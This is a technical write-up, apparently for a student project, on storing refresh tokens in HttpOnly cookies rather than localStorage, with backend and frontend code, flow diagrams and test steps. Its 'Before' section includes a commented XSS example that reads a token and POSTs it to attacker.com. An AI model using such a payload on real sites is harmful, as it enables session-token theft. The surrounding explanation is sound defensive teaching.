# HttpOnly Cookie Implementation for Refresh Tokens

## Overview

This document explains the implementation of HttpOnly cookies for storing refresh tokens, a critical security enhancement that protects against XSS (Cross-Site Scripting) attacks.

## Security Problem Solved

### Before (localStorage)
```typescript
// ❌ VULNERABLE: JavaScript can access refresh tokens
localStorage.setItem('refresh_token', token)
const token = localStorage.getItem('refresh_token')

// If an attacker injects malicious JavaScript:
// <script>
//   const token = localStorage.getItem('refresh_token');
//   fetch('https://attacker.com/steal', { 
//     method: 'POST', 
//     body: token 
//   });
// </script>
```

### After (HttpOnly Cookies)
```typescript
// ✅ SECURE: JavaScript cannot access HttpOnly cookies
// Cookie is set by backend with httpOnly: true flag
// Browser automatically sends cookie with requests
// No way for JavaScript to read or steal the cookie
```

## Architecture Changes

### Token Storage Strategy

| Token Type | Storage Location | Access Method | Vulnerability |
|------------|------------------|---------------|---------------|
| **Access Token** | localStorage | JavaScript can read | XSS vulnerable (short-lived: 15 min) |
| **Refresh Token** | HttpOnly Cookie | Browser only | XSS protected (long-lived: 30 days) |

**Rationale:**
- Access tokens are short-lived (15 minutes), minimizing XSS risk
- Refresh tokens are long-lived (30 days), must be protected with HttpOnly
- If access token is stolen via XSS, damage is limited to 15 minutes
- Refresh token cannot be stolen via XSS due to HttpOnly flag

## Backend Implementation

### 1. Cookie Configuration (auth.controller.ts)

```typescript
private setRefreshTokenCookie(res: Response, refreshToken: string) {
  const isProduction = this.configService.get('NODE_ENV') === 'production';
  
  res.cookie('refresh_token', refreshToken, {
    httpOnly: true,      // ✅ Cannot be accessed by JavaScript
    secure: isProduction, // ✅ HTTPS only in production
    sameSite: 'strict',  // ✅ CSRF protection
    maxAge: 30 * 24 * 60 * 60 * 1000, // 30 days
    path: '/',           // Available for entire domain
  });
}
```

**Security Flags:**
- `httpOnly: true` - Prevents JavaScript access (XSS protection)
- `secure: true` - HTTPS only in production (MITM protection)
- `sameSite: 'strict'` - Cookie only sent to same origin (CSRF protection)

### 2. Login Endpoint Changes

```typescript
// Before
@Post('login')
async login(@Body() dto: LoginDto) {
  return this.authService.login(dto); // Returns both tokens in JSON
}

// After
@Post('login')
async login(@Body() dto: LoginDto, @Res({ passthrough: true }) res: Response) {
  const result = await this.authService.login(dto);
  
  // Set refresh token as HttpOnly cookie
  this.setRefreshTokenCookie(res, result.tokens.refreshToken);
  
  // Return only access token in JSON (refresh token is in cookie)
  return {
    user: result.user,
    tokens: {
      accessToken: result.tokens.accessToken,
    },
  };
}
```

### 3. Refresh Endpoint Changes

```typescript
// Before
@Post('refresh')
async refresh(@Body() dto: RefreshTokenDto) {
  return this.authService.refreshTokens(dto); // Read token from body
}

// After
@Post('refresh')
async refresh(
  @Body() dto: RefreshTokenDto,
  @Req() req: Request,
  @Res({ passthrough: true }) res: Response,
) {
  // Read refresh token from cookie (with fallback to body)
  const refreshToken = 
    (req.cookies?.refresh_token as string | undefined) || dto.refreshToken;

  if (!refreshToken) {
    throw new Error('Refresh token not provided');
  }

  const result = await this.authService.refreshTokens({ refreshToken });

  // Set new refresh token as HttpOnly cookie
  this.setRefreshTokenCookie(res, result.tokens.refreshToken);

  return {
    user: result.user,
    tokens: {
      accessToken: result.tokens.accessToken,
    },
  };
}
```

### 4. Logout Endpoint Changes

```typescript
@Post('logout')
logout(@Res({ passthrough: true }) res: Response) {
  // Clear the refresh token cookie
  this.clearRefreshTokenCookie(res);
  return this.authService.logout();
}
```

### 5. CORS Configuration (main.ts)

```typescript
app.enableCors({
  origin: configService.get<string>('FRONTEND_URL') ?? 'http://localhost:3000',
  credentials: true, // ✅ Allow cookies to be sent cross-origin
});

// Cookie parser middleware
app.use(cookieParser());
```

## Frontend Implementation

### 1. API Client Changes (lib/api/index.ts)

```typescript
// Add credentials to all requests
async function apiCall<T>(endpoint: string, options: RequestInit = {}): Promise<T> {
  const response = await fetch(url, {
    ...rest,
    headers: requestHeaders,
    body,
    credentials: 'include', // ✅ Send cookies with every request
  });
}
```

### 2. Refresh Token Logic Changes

```typescript
// Before
async function refreshAccessToken(): Promise<string> {
  const refreshToken = localStorage.getItem(STORAGE_KEYS.REFRESH_TOKEN);
  
  const response = await fetch(`${API_BASE_URL}/auth/refresh`, {
    method: 'POST',
    body: JSON.stringify({ refreshToken }), // Send token in body
  });
  
  // Store both tokens
  localStorage.setItem(STORAGE_KEYS.ACCESS_TOKEN, data.tokens.accessToken);
  localStorage.setItem(STORAGE_KEYS.REFRESH_TOKEN, data.tokens.refreshToken);
}

// After
async function refreshAccessToken(): Promise<string> {
  // No need to read refresh token - it's in HttpOnly cookie
  const response = await fetch(`${API_BASE_URL}/auth/refresh`, {
    method: 'POST',
    credentials: 'include', // Browser sends cookie automatically
  });
  
  // Store only access token (refresh token is in cookie)
  localStorage.setItem(STORAGE_KEYS.ACCESS_TOKEN, data.tokens.accessToken);
  
  return data.tokens.accessToken;
}
```

### 3. Auth API Changes

```typescript
// Login - only store access token
userLogin: async (credentials) => {
  const response = await apiCall('/auth/login', {
    method: 'POST',
    body: JSON.stringify(credentials),
  });
  
  // Store only access token (refresh token is in HttpOnly cookie)
  if (isBrowser && response.tokens) {
    localStorage.setItem(STORAGE_KEYS.ACCESS_TOKEN, response.tokens.accessToken);
  }
  
  return response;
}

// Logout - only clear access token
logout: async () => {
  const response = await apiCall('/auth/logout', { method: 'POST' });
  
  // Clear only access token (refresh token cookie cleared by backend)
  if (isBrowser) {
    localStorage.removeItem(STORAGE_KEYS.ACCESS_TOKEN);
  }
  
  return response;
}
```

## Flow Diagrams

### Login Flow

```
┌─────────┐                    ┌─────────┐                    ┌──────────┐
│ Browser │                    │ Frontend│                    │ Backend  │
└────┬────┘                    └────┬────┘                    └────┬─────┘
     │                              │                              │
     │  1. Enter credentials        │                              │
     ├─────────────────────────────>│                              │
     │                              │                              │
     │                              │  2. POST /auth/login         │
     │                              ├─────────────────────────────>│
     │                              │     credentials: 'include'   │
     │                              │                              │
     │                              │  3. Validate & generate JWT  │
     │                              │                              │
     │                              │  4. Set-Cookie header        │
     │                              │     refresh_token (HttpOnly) │
     │                              │<─────────────────────────────┤
     │  5. Store cookie             │     { accessToken, user }    │
     │<─────────────────────────────┤                              │
     │                              │                              │
     │                              │  6. Store accessToken        │
     │                              │     localStorage             │
     │                              │                              │
```

### Token Refresh Flow

```
┌─────────┐                    ┌─────────┐                    ┌──────────┐
│ Browser │                    │ Frontend│                    │ Backend  │
└────┬────┘                    └────┬────┘                    └────┬─────┘
     │                              │                              │
     │  1. API call with expired    │                              │
     │     access token             │                              │
     │                              ├─────────────────────────────>│
     │                              │                              │
     │                              │  2. 401 Unauthorized         │
     │                              │<─────────────────────────────┤
     │                              │                              │
     │                              │  3. POST /auth/refresh       │
     │                              ├─────────────────────────────>│
     │  4. Browser auto-sends       │     credentials: 'include'   │
     │     refresh_token cookie ────┼─────────────────────────────>│
     │                              │                              │
     │                              │  5. Verify refresh token     │
     │                              │     from cookie              │
     │                              │                              │
     │                              │  6. Generate new tokens      │
     │                              │                              │
     │                              │  7. Set-Cookie header        │
     │                              │     (new refresh_token)      │
     │  8. Store new cookie         │<─────────────────────────────┤
     │<─────────────────────────────┤     { newAccessToken }       │
     │                              │                              │
     │                              │  9. Store new accessToken    │
     │                              │     Retry original request   │
     │                              │                              │
```

### Logout Flow

```
┌─────────┐                    ┌─────────┐                    ┌──────────┐
│ Browser │                    │ Frontend│                    │ Backend  │
└────┬────┘                    └────┬────┘                    └────┬─────┘
     │                              │                              │
     │  1. Click logout             │                              │
     ├─────────────────────────────>│                              │
     │                              │                              │
     │                              │  2. POST /auth/logout        │
     │                              ├─────────────────────────────>│
     │                              │     credentials: 'include'   │
     │                              │                              │
     │                              │  3. Clear-Cookie header      │
     │                              │     (delete refresh_token)   │
     │  4. Delete cookie            │<─────────────────────────────┤
     │<─────────────────────────────┤     { message: "success" }   │
     │                              │                              │
     │                              │  5. Clear localStorage       │
     │                              │     (access_token)           │
     │                              │                              │
     │                              │  6. Redirect to /signin      │
     │<─────────────────────────────┤                              │
     │                              │                              │
```

## Testing the Implementation

### 1. Test Login

```bash
# Start backend
cd backend
npm run start:dev

# Start frontend (in new terminal)
cd ..
npm run dev
```

1. Navigate to http://localhost:3000/signin
2. Login with valid credentials
3. Open DevTools → Application → Cookies
4. Verify `refresh_token` cookie exists with:
   - ✅ HttpOnly flag
   - ✅ Secure flag (in production)
   - ✅ SameSite: Strict
5. Open DevTools → Application → Local Storage
6. Verify only `access_token` is stored (no `refresh_token`)

### 2. Test Automatic Token Refresh

1. Change `.env` in backend: `JWT_ACCESS_EXPIRES=60` (1 minute)
2. Login and wait 61 seconds
3. Navigate to profile page
4. Check Network tab - should see:
   - First request fails with 401
   - Automatic POST to `/auth/refresh` (with cookie)
   - Original request retried with new access token
5. No "Unauthorized" toast should appear

### 3. Test Logout

1. Login
2. Click logout
3. Open DevTools → Application → Cookies
4. Verify `refresh_token` cookie is deleted
5. Local storage should be cleared
6. Should redirect to signin page

### 4. Test Cookie Security

```javascript
// Open browser console and try to steal token
console.log(document.cookie); 
// Should NOT see refresh_token (HttpOnly protection)

localStorage.getItem('refresh_token');
// Should return null (not stored in localStorage)
```

## Security Comparison

| Attack Vector | localStorage | HttpOnly Cookie |
|--------------|-------------|-----------------|
| **XSS** | ❌ Vulnerable | ✅ Protected |
| **CSRF** | ✅ Not vulnerable | ✅ Protected (SameSite) |
| **MITM** | ⚠️ Depends on HTTPS | ✅ Protected (Secure flag) |
| **Physical Access** | ❌ Easily readable | ⚠️ Harder to extract |

## Best Practices Implemented

1. ✅ **Defense in Depth**: Short-lived access tokens + HttpOnly refresh tokens
2. ✅ **CORS Configuration**: Only allow credentials from trusted origins
3. ✅ **SameSite Cookies**: Prevent CSRF attacks
4. ✅ **Secure Flag**: HTTPS-only in production
5. ✅ **Automatic Rotation**: New refresh token on each refresh
6. ✅ **Graceful Degradation**: Fallback to body if cookies unavailable

## Migration from localStorage

If you have existing users with tokens in localStorage:

1. **Graceful Migration**: The backend refresh endpoint accepts tokens from both cookie and body
2. **Clean Up**: On next login, old localStorage tokens are overwritten
3. **Force Re-login** (Optional): Clear all localStorage on app update

```typescript
// One-time migration script (add to app initialization)
if (localStorage.getItem('refresh_token')) {
  console.warn('Migrating from localStorage to HttpOnly cookies');
  localStorage.removeItem('refresh_token');
  // User will be prompted to login again
}
```

## For Viva Preparation

### Key Points to Explain

1. **Why HttpOnly?**
   - "HttpOnly cookies prevent JavaScript access, protecting against XSS attacks where malicious scripts try to steal authentication tokens."

2. **Why not store access token in HttpOnly cookie too?**
   - "Access tokens are short-lived (15 minutes) and need to be sent in Authorization headers for API calls. HttpOnly cookies can't be read by JavaScript, so we can't add them to headers. The risk is minimal due to short expiration."

3. **How does automatic refresh work?**
   - "When a request fails with 401, the frontend automatically calls /auth/refresh. The browser sends the HttpOnly cookie, backend verifies it, returns a new access token, and the original request is retried."

4. **What about CSRF attacks?**
   - "We use SameSite: 'strict' cookies and CORS configuration to ensure cookies are only sent from our trusted frontend origin."

5. **How is this better than JWT in localStorage?**
   - "It's a hybrid approach: short-lived access tokens in localStorage (minimal XSS risk) + long-lived refresh tokens in HttpOnly cookies (XSS-proof). Best of both worlds."

## Files Modified

### Backend
- `src/auth/auth.controller.ts` - Cookie management, endpoint updates
- `src/auth/dto/refresh-token.dto.ts` - Made refreshToken optional
- `src/main.ts` - Added cookie-parser middleware

### Frontend
- `lib/api/index.ts` - Added credentials: 'include', updated storage logic
- All auth API calls now send cookies automatically

## Dependencies Added

```bash
# Backend
npm install cookie-parser
npm install --save-dev @types/cookie-parser
```

## Conclusion

This implementation significantly improves security by protecting long-lived refresh tokens from XSS attacks while maintaining a smooth user experience with automatic token refresh. The hybrid approach balances security (HttpOnly cookies for refresh tokens) with practicality (localStorage for access tokens that need to be sent in headers).
